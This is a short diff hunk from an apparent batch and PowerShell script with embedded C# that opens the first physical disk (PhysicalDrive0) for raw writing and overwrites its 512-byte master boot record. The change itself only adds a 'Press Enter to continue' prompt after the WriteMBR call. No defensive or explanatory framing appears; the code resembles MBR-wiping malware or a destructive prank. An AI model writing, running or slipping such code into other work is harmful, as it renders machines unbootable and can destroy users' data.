@@ -22,5 +22,6 @@ var h=CreateFile(\"\\\\\\\\.\\\\PhysicalDrive0\",GENERIC_WRITE,FILE_SHARE_READ|F
 if(h.IsInvalid)throw new IOException();
 if(!WriteFile(h,d,512,out uint w,IntPtr.Zero)||w!=512)throw new IOException();
 h.Close();}}'@;^
-[RawDiskAccess]::WriteMBR($d)"
+[RawDiskAccess]::WriteMBR($d);Read-Host -Prompt "Press Enter to continue..."
+"
 pause >nul
